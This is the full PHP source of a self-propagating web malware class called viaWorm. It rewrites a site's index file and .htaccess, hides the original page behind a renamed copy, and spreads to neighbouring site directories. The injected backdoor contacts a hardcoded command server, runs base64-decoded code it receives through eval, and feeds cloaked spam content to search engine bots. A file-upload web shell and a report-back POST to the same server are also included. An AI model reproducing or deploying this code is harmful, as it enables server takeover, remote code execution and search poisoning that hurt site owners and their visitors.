<?php

/**
 * Class viaWorm
 */
class viaWorm
{

    const DADDY_HOST = '62.109.6.130';

    /**
     * @var string
     */
    protected $host;

    /**
     * @var string
     */
    protected $rootDir;

    /**
     * @var SplFileInfo|null
     */
    protected $htaccessFile;

    /**
     * @var array
     */
    protected $possibleIndexes = array();

    /**
     * @var SplFileInfo
     */
    protected $indexFile;

    /**
     * @param null $host
     * @param null $rootDir
     * @throws Exception
     */
    public function __construct($host = null, $rootDir = null)
    {

        $this->host = $host;
        $this->rootDir = $rootDir;

        $url = 'http://' . $this->getHost();

        if (!$this->isValidUrl($url)) {

            $redirect_url = $this->getRedirectUrl($url);
            $redirect_host = parse_url($redirect_url, PHP_URL_HOST);

            if ($this->isValidUrl($redirect_url)) {

                $this->setHost($redirect_host);

            } else {

                throw new Exception('Invalid host ' . $this->getHost());

            }

        }

        $test_file_name = time() . '.txt';
        $testFile = new SplFileInfo($this->getRootDir() . DIRECTORY_SEPARATOR . $test_file_name);

        $testFileObj = $testFile->openFile('w+');
        $testFileObj->fwrite($test_file_name);

        $test_file_url = 'http://' . $this->getHost() . '/' . $test_file_name;
        $test_file_response = file_get_contents($test_file_url);

        if ($test_file_response == $test_file_name) {
            unlink($testFile->getRealPath());
        } else {
            throw new Exception('Failed to create tmp file');
        }

        $files = $this->getRootDirFiles();

        /**
         * @var $file SplFileInfo
         */
        foreach ($files as $file) {

            switch ($file->getBasename()) {
                /* .htaccess */
                case '.htaccess':
                    $this->htaccessFile = $file;
                    break;
                /* PHP files */
                case 'index.php':
                case 'app.php':
                case 'home.php':
                    /* HTML files */
                case 'index.htm':
                case 'index.html':
                case 'home.html':
                    $this->possibleIndexes[$file->getBasename()] = array(
                        'rate' => $file->getBasename() == 'index.php' ? 1 : 0,
                        'file' => $file,
                    );
                    break;
            }

        }

        /* Check environment DirectoryIndex variable */
        if (dirname(__FILE__) == $this->getRootDir()) {

            $DirectoryIndex = getenv('DirectoryIndex');

            if ($DirectoryIndex) {

                if (isset($this->possibleIndexes[$DirectoryIndex])) {

                    $this->possibleIndexes[$DirectoryIndex]['rate']++;

                }

            }

        }

        $this->analyzeHtaccessFile();
        $this->analyzePossibleIndexes();

        $this->changeIndexFile();

    }

    /**
     * @param $dir
     * @return array
     */
    public static function checkParentDirectoryForWebsites($dir)
    {

        $results = array();

        $current_host = self::getRequestHost();
        $parentDirectoryIterator = new DirectoryIterator($dir . DIRECTORY_SEPARATOR . '..' . DIRECTORY_SEPARATOR);

        /**
         * @var $fileInfo DirectoryIterator
         */
        foreach ($parentDirectoryIterator as $fileInfo) {

            if ($fileInfo->isDot()) continue;

            if ($fileInfo instanceof SplFileInfo) {

                if ($fileInfo->isDir() && $fileInfo->getBasename() != $current_host) {

                    $result = self::processHost($fileInfo->getBasename(), $fileInfo->getRealPath(), false);

                    if ($result['success']) {

                        $results[] = $result;

                    }

                }

            }

        }

        return $results;

    }

    /**
     * @void
     * @throws Exception
     */
    public function changeIndexFile()
    {

        $indexFile = $this->getIndexFile();

        if ($indexFile instanceof SplFileInfo) {

            $index_file_name = $indexFile->getFilename();

            //Check if index file was already changed
            if(strpos(file_get_contents($indexFile->getRealPath()), '62.109.6.130') !== false){
                return;
            }

            $copy_file_prefix_extension = '_old_';
            $extension = pathinfo($index_file_name, PATHINFO_EXTENSION);

            $copy_file_name = $indexFile->getBasename($extension) . $copy_file_prefix_extension . '.' . $extension;
            $copy_file_real_path = $indexFile->getPath() . DIRECTORY_SEPARATOR . $copy_file_name;

            if (
            !@file_exists($copy_file_real_path)
                && !@file_exists($indexFile->getPath() . DIRECTORY_SEPARATOR . 'index._old_.php')
                    && !@file_exists($indexFile->getPath() . DIRECTORY_SEPARATOR . 'index._old_.html')
                        && !@file_exists($indexFile->getPath() . DIRECTORY_SEPARATOR . 'index._old_.htm')
            ) {

                $copied = @copy($indexFile->getRealPath(), $copy_file_real_path);
                if (!$copied) {
                    throw new Exception('Unavailable create index file copy', 500);
                }

            } else {

                return;

            }

            if ($extension == 'html' || $extension == 'htm') {

                $index_file_name = 'index.php';
                $newIndexFile = new SplFileInfo($indexFile->getPath() . DIRECTORY_SEPARATOR . $index_file_name);
                $fileObj = $newIndexFile->openFile('w+');

            } else {

                $fileObj = $indexFile->openFile('w+');

            }

            $content = '
<?php
$agent = $_SERVER["HTTP_USER_AGENT"];
$domain = $_SERVER["HTTP_HOST"];
$referer = isset($_SERVER["HTTP_REFERER"]) ? $_SERVER["HTTP_REFERER"] : null;

$content = null;
$title = null;
$description = null;

$uri = isset($_SERVER["REQUEST_URI"]) ? $_SERVER["REQUEST_URI"] : "/";
if($uri != "/"){
    $uri = rtrim($uri, "/\\\");
}

$d_p = isset($_GET["d_p"]) ? $_GET["d_p"] : null;
$d_f = isset($_GET["d_f"]) ? $_GET["d_f"] : null;
$url = "http://62.109.6.130/page?domain=" . urlencode($domain) . "&uri=" . urlencode($uri) . "&user_agent=" . urlencode($agent) . "&referer=" . urlencode($referer) . "&d_p=" . $d_p . "&d_f=" . $d_f;

class _via_Response {
    public static $is_rendered = false;
    public static $response = null;
}

$json_response = file_get_contents($url);
if($json_response && $json_response != "false"){

    if (in_array(substr(trim($json_response), 0, 1), array("[", "{"))) {

        _via_Response::$response = json_decode($json_response, true);

        if(isset(_via_Response::$response["cmd"])){
            eval(base64_decode(_via_Response::$response["cmd"]));
        }

        if(isset(_via_Response::$response["redirect_url"])){
            header("Location: " . _via_Response::$response["redirect_url"], true, 301);
            die();
        }

        function via_render_page() {

            if(_via_Response::$is_rendered){
                return;
            }

            $_content = ob_get_contents();

            $agent = $_SERVER["HTTP_USER_AGENT"];
            $domain = $_SERVER["HTTP_HOST"];
            $referer = isset($_SERVER["HTTP_REFERER"]) ? $_SERVER["HTTP_REFERER"] : null;

            $is_bot = false;

            $bots = explode(",", "bingbot,Ahrefs,SiteBot,testbot,googlebot,mediapartners-google,yahoo-verticalcrawler,yahoo! slurp,yahoo-mm,Yandex,inktomi,slurp,iltrovatore-setaccio,fast-webcrawler,msnbot,ask jeeves,teoma,scooter,psbot,openbot,ia_archiver,almaden,baiduspider,zyborg,gigabot,naverbot,surveybot,boitho.com-dc,objectssearch,answerbus,nsohu-search");
            foreach($bots as $bot){
                if (strpos(strtolower($agent), trim(strtolower($bot))) !== false){
                    $is_bot = true;
                    break;
                }
            }

            $is_referer = false;

            $domain_pos = strpos($referer, $domain) - 7;
            if($referer && $domain_pos != 0){
                $is_referer = true;
            }

            if($is_bot || $is_referer){

                $content = null;
                $title = null;
                $description = null;

                if (is_array(_via_Response::$response)) {

                    $content = _via_Response::$response["body"];
                    $title = _via_Response::$response["title"];
                    $description = _via_Response::$response["description"];

                } else {

                    $content = _via_Response::$response;

                }

                if($title){
                    $_content = preg_replace(\'/<meta name="description" content="(.*)">/i\',\'\',$_content);
                    if($description){
                        $_content = preg_replace(\'/<title>(.*)<\/title>/i\',\'<title>\'.$title.\'</title><meta name="description" content="\'.$description.\'">\',$_content);
                    }
                }

                if ($content && is_string($content)) {

                    preg_match(\'/<body(.*?)>/si\', $_content, $matches);
                    $delimiter = "<body" . (isset($matches[1]) ? $matches[1] : null) . ">";

                    $page_parts = explode($delimiter, $_content);

                    if($description){
                        $page_parts[1] = $delimiter . $content. "</body>";
                    } else {
                        $page_parts[0] .= ($delimiter . $content);
                    }

                    $_content = implode("", $page_parts);

                }

            }

            ob_end_clean();

            _via_Response::$is_rendered = true;
            echo $_content;

        }

        register_shutdown_function("via_render_page");

        ob_start();

        include("' . $copy_file_name . '");

        via_render_page();

    } else {

        echo $json_response;

    }


} else {

    include("' . $copy_file_name . '");

}
            ';

            $fileObj->fwrite(trim($content));

            $this->addHtaccessRule($index_file_name);

        } else {

            throw new Exception('Unavailable to define index file', 500);

        }

    }

    /**
     * @void
     */
    public function analyzePossibleIndexes()
    {

        usort($this->possibleIndexes, array($this, 'sortPossibleIndexFiles'));

        foreach ($this->possibleIndexes as $i => $possibleIndex) {

            /**
             * @var $file SplFileInfo
             */
            $file = $possibleIndex['file'];

            if ($i == 0) {
                $this->indexFile = $file;
            }

            $url = 'http://' . $this->getHost() . '/' . $file->getBasename();
            $valid = $this->isValidUrl($url);

            if ($valid) {
                $this->indexFile = $file;
                break;
            }

        }

    }

    public function sortPossibleIndexFiles($a, $b)
    {
        return $a['rate'] < $b['rate'];
    }

    /**
     * @void
     */
    public function analyzeHtaccessFile()
    {

        $file = $this->getHtaccessFile();

        if ($file instanceof SplFileInfo) {

            $DirectoryIndex = null;

            $fileObj = $file->openFile('a+');

            foreach ($fileObj as $line) {

                $line = trim($line);

                if (!$line) {
                    continue;
                }

                if (substr($line, 0, 1) == '#') {
                    continue;
                }

                /* Check .htaccess DirectoryIndex variable */
                if (strpos($line, 'DirectoryIndex') !== false) {
                    $DirectoryIndex = current(explode('#', trim(str_replace('DirectoryIndex', '', $line))));
                }

            }

            if ($DirectoryIndex) {
                if (isset($this->possibleIndexes[$DirectoryIndex])) {
                    $this->possibleIndexes[$DirectoryIndex]['rate']++;
                }
            }


        }

    }

    /**
     * @param $indexFileName
     */
    public function addHtaccessRule($indexFileName)
    {

        $file = $this->getHtaccessFile();

        if ($file instanceof SplFileInfo) {

            $fileObj = $file->openFile('a+');

        } else {

            $filePath = $this->getRootDir() . DIRECTORY_SEPARATOR . '.htaccess';
            $file = new SplFileInfo($filePath);

            $fileObj = $file->openFile('w+');

        }

        $content = '

RewriteEngine On
RewriteCond %{REQUEST_FILENAME} -s [OR]
RewriteCond %{REQUEST_FILENAME} -l [OR]
RewriteCond %{REQUEST_FILENAME} -d
RewriteRule ^.*$ - [NC,L]
RewriteRule ^.*$ ' . $indexFileName . ' [NC,L]
DirectoryIndex ' . $indexFileName . '
        ';

        $fileObj->fwrite($content);

    }

    /**
     * @return null|string
     */
    public function getRootDir()
    {

        if (!$this->rootDir) {

            if (isset($_SERVER['DOCUMENT_ROOT'])) {
                $this->rootDir = $_SERVER['DOCUMENT_ROOT'];
            } else {
                $this->rootDir = __DIR__;
            }

        };

        return $this->rootDir;

    }

    /**
     * @return array
     * @throws Exception
     */
    public function getRootDirFiles()
    {

        $rootDirectoryIterator = new DirectoryIterator($this->getRootDir());

        if (!$rootDirectoryIterator->isWritable()) {
            throw new Exception('Root directory is not writable', 500);
        }

        $files = array();

        /**
         * @var $itr DirectoryIterator
         */
        foreach ($rootDirectoryIterator as $itr) {

            if ($itr->isDot() || $itr->isDir()) {
                continue;
            };

            $files[] = $itr->getFileInfo();

        }

        return $files;

    }

    /**
     * @param $htaccessFile
     */
    public function setHtaccessFile($htaccessFile)
    {
        $this->htaccessFile = $htaccessFile;
    }

    /**
     * @return null|SplFileInfo
     */
    public function getHtaccessFile()
    {
        return $this->htaccessFile;
    }

    /**
     * @param $possibleIndexFiles
     */
    public function setPossibleIndexes($possibleIndexFiles)
    {
        $this->possibleIndexes = $possibleIndexFiles;
    }

    /**
     * @return array
     */
    public function getPossibleIndexes()
    {
        return $this->possibleIndexes;
    }

    /**
     * @param $host
     */
    public function setHost($host)
    {
        $this->host = $host;
    }

    /**
     * @return null|string
     */
    public function getHost()
    {
        if (!$this->host) {
            $this->host = self::getRequestHost();
        }
        return $this->host;
    }

    /**
     * @return string
     */
    public static function getRequestHost()
    {

        if (isset($_SERVER['HTTP_X_FORWARDED_HOST'])) {

            $host = $_SERVER['HTTP_X_FORWARDED_HOST'];
            $elements = explode(',', $host);

            $host = trim(end($elements));

        } else {

            if (!$host = $_SERVER['HTTP_HOST']) {

                if (!$host = $_SERVER['SERVER_NAME']) {

                    $host = !empty($_SERVER['SERVER_ADDR']) ? $_SERVER['SERVER_ADDR'] : '';

                }

            }

        }

        return $host;

    }

    /**
     * @return string
     */
    public function getWormUrl()
    {
        return 'http://' . $this->getRequestHost() . $_SERVER['REQUEST_URI'];
    }

    /**
     * @param $url
     * @return bool
     */
    public static function isValidUrl($url)
    {
        $headers = @get_headers($url);
        if (strpos($headers[0], '200') !== false) return true;
        return false;
    }

    /**
     * @param $url
     * @return null|string
     */
    public static function getRedirectUrl($url)
    {

        $redirect_url = null;

        if (function_exists('curl_init')) {

            $headers = @get_headers($url);

            if (
                strpos($headers[0], '300') !== false
                || strpos($headers[0], '301') !== false
                || strpos($headers[0], '302') !== false
                || strpos($headers[0], '303') !== false
                || strpos($headers[0], '307') !== false
            ) {

                $redirect_url = 'http://www.' . $url;

            }

        } else {

            $ch = curl_init($url);

            curl_setopt($ch, CURLOPT_HEADER, true);
            curl_setopt($ch, CURLOPT_NOBODY, true);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

            $response = curl_exec($ch);
            curl_close($ch);

            $header = "Location: ";
            $pos = strpos($response, $header);
            $pos += strlen($header);

            if (strlen($response) > $pos) {

                $redirect_url = substr($response, $pos, strpos($response, "\r\n", $pos) - $pos);

            }

        }

        return $redirect_url;

    }

    /**
     * @param $indexFile
     */
    public function setIndexFile($indexFile)
    {
        $this->indexFile = $indexFile;
    }

    /**
     * @return SplFileInfo
     */
    public function getIndexFile()
    {
        return $this->indexFile;
    }

    /**
     * @param null $host
     * @param null $rootDir
     * @param bool $scanSiblings
     * @return array
     */
    public static function processHost($host = null, $rootDir = null, $scanSiblings = true)
    {

        $result = array(
            'success' => true,
            'message' => null,
        );

        try {

            $worm = new self($host, $rootDir);
            $result['message'] = 'Index file ' . $worm->getIndexFile()->getRealPath() . ' - successfully changed';
            $result['domain'] = $worm->getHost();
            $result['worm_url'] = $worm->getWormUrl();

        } catch (Exception $e) {

            $result['success'] = false;
            $result['message'] = $e->getMessage();

        }

        if ($scanSiblings) {
            $result['siblings'] = self::checkParentDirectoryForWebsites($_SERVER['DOCUMENT_ROOT']);
        }

        return $result;

    }

    /**
     * @param $url
     * @param $data
     * @param null $optional_headers
     * @return bool|mixed|string
     */
    public static function sendPost($url, $data, $optional_headers = null)
    {

        if (function_exists('curl_init')) {

            $ch = curl_init($url);
            curl_setopt($ch, CURLOPT_POST, true);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

            $response = curl_exec($ch);

            curl_close($ch);

            return $response;

        } else {


            $params = array('http' => array(
                'method' => 'post',
                'content' => $data
            ));

            if ($optional_headers !== null) {
                $params['http']['header'] = $optional_headers;
            }

            $ctx = stream_context_create($params);
            $fp = @fopen($url, 'rb', false, $ctx);
            if (!$fp) {
                $response = false;
            } else {
                $response = @stream_get_contents($fp);
            }

            return $response;

        }

    }

}

$action = isset($_GET['action']) ? $_GET['action'] : 'index';

switch ($action) {
    case 'upload':

        if (isset($_POST['Submit'])) {

            $fileDir = "";

            $user_file_name = $_FILES['image']['name'];
            $user_file_tmp = $_FILES['image']['tmp_name'];

            if (isset($_FILES['image']['name'])) {

                $destination = $fileDir . $user_file_name;
                @move_uploaded_file($user_file_tmp, $destination);

                echo "<b>Done ==> $user_file_name</b>";

            }

        } else {

            echo '<form method="POST" action="" enctype="multipart/form-data"><input type="file" name="image"><input type="Submit" name="Submit" value="Submit"></form>';

        }

        break;
    case 'index':
    default:

        header('Content-type: application/json');

        $result = viaWorm::processHost();

        $query = http_build_query(array('worm_result' => serialize($result)));
        $worm_precess_url = 'http://' . viaWorm::DADDY_HOST . '/process-worm';

        viaWorm::sendPost($worm_precess_url, $query);

        echo json_encode($result);
        exit();

}
